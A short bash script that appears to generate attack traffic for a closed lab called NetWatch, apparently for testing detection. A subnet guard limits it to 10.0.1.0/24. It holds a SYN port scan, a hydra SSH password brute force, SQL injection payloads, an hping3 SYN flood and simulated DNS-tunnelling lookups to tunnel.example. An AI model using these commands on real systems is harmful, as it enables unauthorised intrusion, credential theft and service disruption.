#!/usr/bin/env bash
# Attack scripts for the closed NetWatch lab. They refuse to target anything outside 10.0.1.0/24.
set -euo pipefail
TARGET="${TARGET:-10.0.1.10}"
case "$TARGET" in
  10.0.1.*) ;;
  *) echo "Refusing to target $TARGET: only the 10.0.1.0/24 lab network is allowed." >&2; exit 2 ;;
esac

run_scan()  { nmap -sS -p 1-2000 --min-rate 1000 "$TARGET"; }
run_brute() { hydra -l root -P /wordlist.txt -t 4 "ssh://$TARGET"; }
run_sqli()  {
  curl -s -o /dev/null "http://$TARGET/?id=1'%20OR%201=1--"
  curl -s -o /dev/null "http://$TARGET/?q=1%20UNION%20SELECT%20username,password%20FROM%20users"
}
run_flood() { timeout 3 hping3 -S -p 80 --faster "$TARGET" || true; }
run_dns()   {
  for _ in $(seq 1 8); do
    a=$(head -c 30 /dev/urandom | base32 | tr -d '=' | tr 'A-Z' 'a-z' | cut -c1-40)
    b=$(head -c 30 /dev/urandom | base32 | tr -d '=' | tr 'A-Z' 'a-z' | cut -c1-40)
    dig +short +time=1 +tries=1 "@$TARGET" "$a.$b.tunnel.example" || true
  done
}

case "${1:-}" in
  scan) run_scan ;;
  bruteforce) run_brute ;;
  sqli) run_sqli ;;
  flood) run_flood ;;
  dns) run_dns ;;
  all) run_scan; sleep 5; run_brute; sleep 5; run_sqli; sleep 5; run_dns; sleep 5; run_flood ;;
  *) echo "usage: attack {scan|bruteforce|sqli|flood|dns|all}" >&2; exit 1 ;;
esac
